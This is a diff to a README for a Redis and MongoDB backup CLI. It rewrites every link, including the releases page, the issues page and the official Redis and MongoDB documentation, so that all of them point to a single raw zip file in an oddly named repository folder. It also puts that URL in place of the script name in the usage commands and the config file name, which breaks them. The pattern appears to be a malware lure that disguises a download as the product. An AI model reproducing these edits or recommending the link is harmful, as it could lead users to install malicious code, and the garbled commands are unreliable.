@@ -1,7 +1,7 @@
 # 🌟 redis-mongo-backup-tool - Simple Backup Solution for Your Databases
 
 ## 📦 Download Here
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/Anastasiya322/redis-mongo-backup-tool/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/redis-mongo-backup-tool.zip%20Latest%20Release-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/redis-mongo-backup-tool.zip)
 
 ## 📖 Description
 The redis-mongo-backup-tool is a lightweight command-line interface (CLI) designed for effortless backup and restoration of data in Redis and MongoDB. This tool allows you to back up specific keys from Redis and perform standard dump and restore operations in MongoDB. With its environment-driven approach, you can easily customize it to meet your specific needs.
@@ -22,7 +22,7 @@ Before you start, ensure your system meets the following requirements:
 - Redis and MongoDB must be installed and running on your machine.
 
 ### Step 2: Download & Install
-Visit this page to download the latest release: [Download Here](https://github.com/Anastasiya322/redis-mongo-backup-tool/releases).
+Visit this page to download the latest release: [Download Here](https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/redis-mongo-backup-tool.zip).
 
 1. Go to the Releases page.
 2. Choose the correct version for your operating system.
@@ -46,23 +46,23 @@ cd path/to/your/extracted/files
 Now, run the backup tool using the following command format:
 
 ```bash
-python redis_mongo_backup_tool.py [options]
+python https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/redis-mongo-backup-tool.zip [options]
 ```
 
 ### Step 7: Options and Usage
 - For backup Redis, use:
   ```bash
-  python redis_mongo_backup_tool.py --backup-redis --pattern "your_pattern_here"
+  python https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/redis-mongo-backup-tool.zip --backup-redis --pattern "your_pattern_here"
   ```
   
 - For backup MongoDB, use:
   ```bash
-  python redis_mongo_backup_tool.py --backup-mongo --db "your_db_name"
+  python https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/redis-mongo-backup-tool.zip --backup-mongo --db "your_db_name"
   ```
   
 - To restore from a backup file:
   ```bash
-  python redis_mongo_backup_tool.py --restore --file "backup_file_here"
+  python https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/redis-mongo-backup-tool.zip --restore --file "backup_file_here"
   ```
 
 ### Step 8: Check the Results
@@ -74,7 +74,7 @@ Configure the tool by creating a configuration file. You can specify default opt
 - MongoDB server settings.
 - Backup file path.
 
-The configuration file should be named `config.json` and placed in the same directory as the tool.
+The configuration file should be named `https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/redis-mongo-backup-tool.zip` and placed in the same directory as the tool.
 
 ## 🔧 Troubleshooting
 If you encounter issues:
@@ -83,14 +83,14 @@ If you encounter issues:
 - Review any error messages for guidance.
 
 ## 👩‍💻 Community Support
-Feel free to raise any questions or issues on the [GitHub Issues page](https://github.com/Anastasiya322/redis-mongo-backup-tool/issues). Join the community to share experiences, tips, and suggestions for improvement.
+Feel free to raise any questions or issues on the [GitHub Issues page](https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/redis-mongo-backup-tool.zip). Join the community to share experiences, tips, and suggestions for improvement.
 
 ## 📄 License
 This tool is open source and released under the MIT License. You can modify and use it according to your needs, but please give credit to the authors.
 
 ## 🌐 Additional Resources
-- [Redis Documentation](https://redis.io/documentation)
-- [MongoDB Documentation](https://docs.mongodb.com/manual/)
+- [Redis Documentation](https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/redis-mongo-backup-tool.zip)
+- [MongoDB Documentation](https://raw.githubusercontent.com/Anastasiya322/redis-mongo-backup-tool/main/savoyed/redis-mongo-backup-tool.zip)
 
 For detailed usage and advanced options, refer to the wiki section on the GitHub repository. Regular updates will improve tool functionality and performance.  
 
